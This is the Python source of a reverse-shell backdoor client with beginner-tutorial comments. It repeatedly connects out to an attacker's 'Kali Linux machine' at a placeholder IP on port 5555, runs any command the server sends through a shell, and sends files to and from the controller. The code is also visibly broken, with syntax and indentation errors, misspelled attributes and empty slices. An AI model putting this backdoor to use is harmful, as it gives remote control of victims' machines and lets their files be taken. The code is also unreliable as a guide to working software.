#Socket allows us to initiate connection, time because we used a time function in the code 
import socket 
import time 
#This library will allow us to execute any command that the server sends 
import subprocess 

import json 
import os 

def reliable_send(data): 
  jsondata = json.dumps(data) 
  s.send(json.encode()) 

 def reliable_recv(): 
  data = '' 
   #While true = infinite loop
  while True: 
      try: 
        data = data + s.recv(1024).decode().rstrip() 
        return json.loads(data) 
      except ValueError: 
        continue 

 

#Calling the connection function, starts an infinite 'While true' loop, it sleeps for 20 seconds, then tries to connect to our Kali Linux machine (the IP address), if it connects, it goes to the shell function, if it doesn’t, then it goes back to the same function again. 
def connection(): 
  while True: 
  time.sleep(20) 
  try: 
    s.connect(('IP ADDRESS', 5555) #// CHANGE THIS 
    shell() 
    s.close()  
    break 
  except: 
    connection() 

#File name as parameter. Open the file you want to upload to the server (file_name) with rb (read bytes) and send the content to the server program 
def upload_file(file_name): 
  f = open(file_name, 'rb') 
  s.send(f.read()) 

 def download_file(file_name):  
  f = open(file_name, 'wb') 
  s.settimeout(1) 
  chunk = s.recv(1024) 
  while chunk:  
    f.write(chunk) 
    try: 
      chunk = s.recv(1024) 
  except socket.timeout as e: 
    break 
s.settimeout(None) 
f.close() 

 
def shell(): 
  while True: 
    command = reliable_recv() 
    if command == 'quit': 
      break 
  elif command == 'clear': 
      pass 
  elif command[: 3] == 'cd ': 
      os.chdir(command[3:]) 
  elif command[:8] == 'download': 
      upload_file(command[9:1]) 
  elif command[:6] == 'upload': 
      download_file(command[7:1]) 
  else: 
      execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) 
      result = execute.stdbut.read() + execute.stderr.read() 
      result = result.decode() 
      reliable_send(result) 
    
s = socket. Socket(socket.AF_INET, socket.SOCK_STREAM 
connection() 
